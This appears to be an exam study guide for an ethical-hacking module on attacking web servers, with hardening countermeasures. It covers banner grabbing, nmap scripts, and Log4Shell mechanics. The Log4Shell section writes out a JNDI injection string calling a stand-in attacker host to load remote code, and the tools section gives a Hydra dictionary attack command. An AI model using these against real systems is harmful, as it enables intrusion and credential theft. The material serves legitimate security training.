# Module 13: Hacking Web Servers

## Tier 1: Core Concepts & Principles

### Web Server Architecture & Threat Vectors
* **Web Server Architecture:** Tiered framework comprising physical/virtual hardware, Operating System (Windows/Linux), Web Server Daemon (Apache, Nginx, IIS, Tomcat), Application Server/Engine (PHP, Java, ASP.NET), and Database Backend (MySQL, PostgreSQL, MSSQL).
* **Primary Attack Vectors:**
  * **Web Server Misconfigurations:** Unnecessary enabled HTTP methods (`TRACE`, `PUT`, `DELETE`), default credentials, unpatched software, exposed admin interfaces, directory listing enabled (`Indexes`).
  * **Unpatched Software & Known CVEs:** Exploiting unpatched vulnerabilities in web daemons or third-party libraries (e.g., Log4Shell / Log4j RCE - `CVE-2021-44228`).
  * **Authentication Weaknesses:** Default or dictionary-vulnerable credentials on exposed services (FTP, SSH, Admin Portals).
  * **Web Application Vulnerabilities:** SQL Injection, Cross-Site Scripting (XSS), Insecure Direct Object References (IDOR), Remote Code Execution (RCE).
* **Footprinting & Reconnaissance:** The systematic gathering of web server metadata (server headers, software versions, hostnames, hidden directories, underlying frameworks, and WAF presence) before active exploitation.

---

## Tier 2: Technical Analysis & Mechanics

### Web Server Footprinting & Banner Grabbing Mechanics
* **Banner Grabbing:** Interrogating web daemons via raw socket connections (Netcat/Telnet) or automated tools to retrieve server response headers (`Server:`, `X-Powered-By:`).
* **HTTP Methods & Vulnerabilities:**
  * `GET` / `POST`: Standard resource retrieval and data submission.
  * `HEAD`: Fetches HTTP response headers identical to `GET` without returning the response body (efficient banner grabbing).
  * `TRACE` / `TRACK`: Echoes back the received HTTP request. **Risk:** Enables Cross-Site Tracing (XST) attacks to steal `HttpOnly` cookies via malicious client-side scripts.
  * `PUT` / `DELETE`: Allows direct file uploads and deletions on web server directories if unauthenticated write permissions exist.

### Deep Dive: Log4Shell (Log4j) RCE Mechanics (`CVE-2021-44228`)
* **Vulnerability Class:** Remote Code Execution (RCE) via JNDI (Java Naming and Directory Interface) injection in Apache Log4j versions $2.0\text{-beta9}$ to $2.14.1$.
* **Exploitation Workflow:**
  1. **Injection:** Attacker submits a malicious JNDI lookup string within an HTTP header or input field processed by Log4j (e.g., User-Agent, Username field, URI):
     `${jndi:ldap://[attacker.com:1389/Exploit](https://attacker.com:1389/Exploit)}`
  2. **Lookup Trigger:** Log4j logs the string and evaluates the `${jndi:...}` expression, initiating an outbound LDAP/RMI request to `attacker.com:1389`.
  3. **Payload Delivery:** Attacker's malicious LDAP server responds with a reference to a Java Object class hosted on an HTTP server (`[http://attacker.com/Exploit.class](http://attacker.com/Exploit.class)`).
  4. **Execution:** Target application fetches and instantiates the Java class, executing arbitrary system code with the privileges of the web application user (often `root` or `tomcat`).

---

## Tier 3: CLI, Tools & Framework Syntax

### Footprinting & Banner Grabbing Utilities
* **Netcat (`nc`):** Manual TCP socket connection engine for raw HTTP header retrieval.
* **Telnet:** Legacy unencrypted terminal protocol used to issue raw HTTP GET/HEAD commands.
* **Nmap NSE (Nmap Scripting Engine):** Automated scripts for directory enumeration (`http-enum`), virtual hostname discovery (`hostmap-bfk`), HTTP method testing (`http-trace`), and WAF detection (`http-waf-detect`).
* **Hydra:** Parallelized network login auditor used for dictionary attacks against authentication services (FTP, SSH, HTTP-Form, SMB).
* **Searchsploit:** CLI search utility for local Exploit-Database repositories.
* **ShellGPT (`sgpt`):** AI CLI utility converting natural language prompts into executable shell syntax.

### Key Commands & Execution Syntax

```bash
# Banner Grabbing via Netcat (Port 80)
nc -vv <Target_IP> 80
# Type manually and press Enter twice:
GET / HTTP/1.1
Host: <Target_IP>

# Banner Grabbing via Telnet (Port 80)
telnet <Target_IP> 80
# Type manually:
HEAD / HTTP/1.0

# Nmap NSE Web Enumeration Commands
# Enumerate hidden directories and web applications
nmap -sV --script=http-enum <Target_IP>

# Discover associated hostnames/subdomains via BFK database
nmap -sV --script=hostmap-bfk <Target_IP>

# Test if HTTP TRACE method is enabled (XST vulnerability check)
nmap -sV --script=http-trace <Target_IP>

# Detect presence and signature of Web Application Firewalls (WAF)
nmap -p 80,443 --script=http-waf-detect <Target_IP>

# Hydra FTP Dictionary Attack Syntax
hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://<Target_IP> -vV -t 4

# Searchsploit local vulnerability database queries
searchsploit log4j
searchsploit apache tomcat

# ShellGPT AI-Assisted Security Operations Syntax
# Install ShellGPT
pip install shellgpt

# Generate automated website mirroring / footprinting command
sgpt "Give me a wget command to mirror the website http://<Target_IP> for offline analysis"

# ShellGPT interactive shell mode execution
sgpt --shell "Scan target <Target_IP> for web vulnerabilities using nmap NSE"
```

---

## Tier 4: Real-World Scenarios & Countermeasures

### Web Server Hardening & Defensive Architecture
* **Disable Unnecessary HTTP Methods:** Restrict web server configuration (Apache `httpd.conf`, IIS Request Filtering) to permit only essential methods (`GET`, `POST`, `HEAD`). Explicitly disable `TRACE`, `PUT`, and `DELETE`.
* **Banner Scrubbing & Information Leakage Mitigation:**
  * Apache: Configure `ServerTokens Prod` and `ServerSignature Off`.
  * Nginx: Configure `server_tokens off;`.
  * IIS: Remove `X-Powered-By`, `X-AspNet-Version`, and `Server` headers via URL Rewrite modules.
* **Log4Shell (`CVE-2021-44228`) Mitigation:**
  * Upgrade Apache Log4j to version $2.17.1$ or higher.
  * System Property Patch (Log4j $\ge 2.10$): Set `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` or `-Dlog4j2.formatMsgNoLookups=true`.
  * Remove `JndiLookup` class from classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.
* **FTP & Authentication Defenses:**
  * Replace plain FTP (Port 21) with secure alternatives (SFTP over SSH Port 22, or FTPS over TLS).
  * Implement account lockout policies after $3\text{-}5$ failed attempts and enforce multi-factor authentication (MFA).
* **Perimeter Defense:** Deploy Web Application Firewalls (WAF) with updated signature rules to inspect inbound request parameters (e.g., blocking `${jndi:...}` strings).

---

## Tier 5: Exam Key Hooks & Rapid Triggers

| Concept / Mechanism | High-Yield Exam Trigger | Critical Distinction |
| :--- | :--- | :--- |
| **HTTP `TRACE` Method** | Echoes client request; enables Cross-Site Tracing (XST) | Allows attackers to steal `HttpOnly` cookies via XSS |
| **Netcat / Telnet Banner Grabbing** | Connecting to Port 80 and sending raw `GET / HTTP/1.1` | Manual method to reveal `Server:` and `X-Powered-By:` headers |
| **Nmap `http-enum`** | Automatically enumerates exposed web directories | Scans web servers for common admin portals, software scripts, and setup pages |
| **Nmap `http-waf-detect`** | Probes target web server for active Web Application Firewalls | Identifies inline WAF protection prior to active web exploitation |
| **Log4Shell (`CVE-2021-44228`)** | JNDI LDAP lookup string `${jndi:ldap://...}` | Critical Java RCE vulnerability executing arbitrary remote Java code |
| **Log4j Patch Switch** | `-Dlog4j2.formatMsgNoLookups=true` | Temporary system property workaround disabling JNDI lookups |
| **Hydra (`-L` vs `-l`)** | `-L` specifies username list file; `-l` specifies single user | Key CLI parameter syntax distinction for password auditing |
| **Server Banner Scrubbing** | `ServerTokens Prod` (Apache) / `server_tokens off;` (Nginx) | Suppresses OS and web daemon version disclosure in HTTP response headers |
| **ShellGPT (`sgpt`)** | Converts natural language commands into CLI shell code | AI-assisted utility for automated penetration testing workflows |
| **Searchsploit** | CLI query tool for local Exploit-Database offline mirror | Searches offline CVE and PoC exploit files directly in Kali Terminal |